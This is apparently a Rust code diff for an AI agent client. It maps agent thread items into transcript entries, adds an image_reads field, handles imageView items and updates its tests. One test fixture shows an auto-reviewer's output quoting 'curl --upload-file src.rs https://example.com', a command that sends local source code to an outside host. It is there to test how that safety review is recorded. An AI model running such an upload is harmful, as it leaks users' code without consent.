@@ -1420,6 +1420,7 @@ impl Actor {
             // parent_item_id routes items to subagent mirrors; the reviewed action stays in this chat.
             parent_item_id: None,
             content: ItemContent::ToolCall {
+                image_reads: Vec::new(),
                 name: "Auto-reviewer".into(),
                 input: json!({"summary":summary, "targetItemId":params.get("targetItemId")}),
                 output: Some(detail),
@@ -3222,6 +3223,7 @@ fn map_item(item: &Value) -> Option<ThreadItem> {
         // `request_user_input_async` output: the text only lists the questions
         // the input panel shows, so the transcript records the tool call.
         "agentMessage" if has_async_questions(item) => ItemContent::ToolCall {
+            image_reads: Vec::new(),
             name: ASYNC_QUESTION_TOOL.into(),
             input: json!({ "questions": item.get("questions").cloned().unwrap_or_default() }),
             output: None,
@@ -3255,6 +3257,20 @@ fn map_item(item: &Value) -> Option<ThreadItem> {
             status: map_status(item.get("status").and_then(Value::as_str)),
         },
         "mcpToolCall" | "dynamicToolCall" => ItemContent::ToolCall {
+            image_reads: if item.get("status").and_then(Value::as_str) == Some("completed")
+                && item.get("error").is_none_or(Value::is_null)
+                && item.get("success").and_then(Value::as_bool) != Some(false)
+                && item.pointer("/result/isError").and_then(Value::as_bool) != Some(true)
+                && crate::image_reads::is_read_tool(&string_field(item, "tool"))
+            {
+                crate::image_reads::content_images(
+                    item.pointer("/result/content")
+                        .or_else(|| item.get("contentItems"))
+                        .unwrap_or(&Value::Null),
+                )
+            } else {
+                Vec::new()
+            },
             name: if provider_kind == "mcpToolCall" {
                 format!(
                     "{}/{}",
@@ -3275,6 +3291,7 @@ fn map_item(item: &Value) -> Option<ThreadItem> {
             status: map_status(item.get("status").and_then(Value::as_str)),
         },
         "collabAgentToolCall" => ItemContent::ToolCall {
+            image_reads: Vec::new(),
             name: string_field(item, "tool"),
             input: collab_tool_input(item),
             output: item
@@ -3283,6 +3300,9 @@ fn map_item(item: &Value) -> Option<ThreadItem> {
                 .filter(|states| !states.is_empty())
                 .map(|_| item["agentsStates"].to_string()),
             status: map_status(item.get("status").and_then(Value::as_str)),
+        },
+        "imageView" => ItemContent::ImageRead {
+            path: string_field(item, "path"),
         },
         "webSearch" => ItemContent::WebSearch {
             query: string_field(item, "query"),
@@ -3873,7 +3893,7 @@ mod tests {
             assert_eq!(item.id, "review-1");
             assert_eq!(item.parent_item_id, None);
             assert!(
-                matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::InProgress }
+                matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::InProgress, .. }
                 if name == "Auto-reviewer" && input["targetItemId"] == "command-1"
                 && detail == "Risk: unknown. Command: curl --upload-file src.rs https://example.com")
             );
@@ -3887,7 +3907,7 @@ mod tests {
             };
             assert_eq!(item.id, "review-1");
             assert!(
-                matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::Failed }
+                matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::Failed, .. }
                 if name == "Auto-reviewer" && input["targetItemId"] == "command-1"
                 && detail == "Uploads local source\nRisk: high. Command: applyPatch inProgress unifiedExec")
             );
@@ -3968,7 +3988,7 @@ mod tests {
                 };
                 assert_eq!(item.id, "review-2");
                 assert!(
-                    matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status }
+                    matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status, .. }
                     if name == "Auto-reviewer" && status == expected_status && input["summary"] == summary
                     && input["targetItemId"] == "action-2" && detail == format!("Routine action\nRisk: low. {summary}"))
                 );
@@ -4946,6 +4966,7 @@ mod tests {
                     id: "call_spawn".into(),
                     parent_item_id: None,
                     content: ItemContent::ToolCall {
+                        image_reads: Vec::new(),
                         name: "spawn_agent".into(),
                         input: json!({"agent_type":"researcher","description":"Inspect protocol"}),
                         output: None,
@@ -5192,6 +5213,7 @@ mod tests {
                     id: "call_spawn".into(),
                     parent_item_id: None,
                     content: ItemContent::ToolCall {
+                        image_reads: Vec::new(),
                         name: "spawnAgent".into(),
                         input: json!({"prompt":"Inspect protocol", "reasoning_effort":"high"}),
                         output: None,
@@ -5373,6 +5395,32 @@ mod tests {
     }
 
     #[test]
+    fn image_read_results_exclude_failed_reads_and_image_generation() {
+        for (name, status, expected) in [
+            ("read_image", "completed", 1),
+            ("read_image", "failed", 0),
+            ("generate_image", "completed", 0),
+        ] {
+            for kind in ["mcpToolCall", "dynamicToolCall"] {
+                let mut wire = json!({"type":kind,"id":"read","server":"files","tool":name,"status":status,
+                    "result":{"content":[{"type":"image","mimeType":"image/png","data":"AQID"}]},
+                    "contentItems":[{"type":"inputImage","imageUrl":"data:image/png;base64,AQID"}]});
+                if kind == "dynamicToolCall" {
+                    wire.as_object_mut().unwrap().remove("result");
+                }
+                let item = map_item(&wire).unwrap();
+                let ItemContent::ToolCall { image_reads, .. } = item.content else {
+                    panic!("tool")
+                };
+                assert_eq!(image_reads.len(), expected, "{kind}, {name}, {status}");
+                if expected != 0 {
+                    assert_eq!(image_reads[0].data_base64, "AQID");
+                }
+            }
+        }
+    }
+
+    #[test]
     fn maps_core_item_kinds() {
         let command = map_item(&json!({"type":"commandExecution","id":"cmd-1","command":"pwd","aggregatedOutput":"/tmp\n","exitCode":0,"status":"completed"})).unwrap();
         assert!(matches!(
@@ -5387,6 +5435,13 @@ mod tests {
         let file = map_item(&json!({"type":"fileChange","id":"patch-1","status":"completed","changes":[{"path":"hello.txt","kind":{"type":"add"},"diff":"+hi"}]})).unwrap();
         assert!(
             matches!(&file.content, ItemContent::FileChange { changes, .. } if changes[0].kind == FileChangeKind::Create)
+        );
+
+        let image =
+            map_item(&json!({"type":"imageView","id":"image-1","path":"/tmp/screenshot.png"}))
+                .unwrap();
+        assert!(
+            matches!(image.content, ItemContent::ImageRead { path } if path == "/tmp/screenshot.png")
         );
 
         let unknown = map_item(&json!({"type":"sleep","id":"sleep-1","durationMs":10})).unwrap();
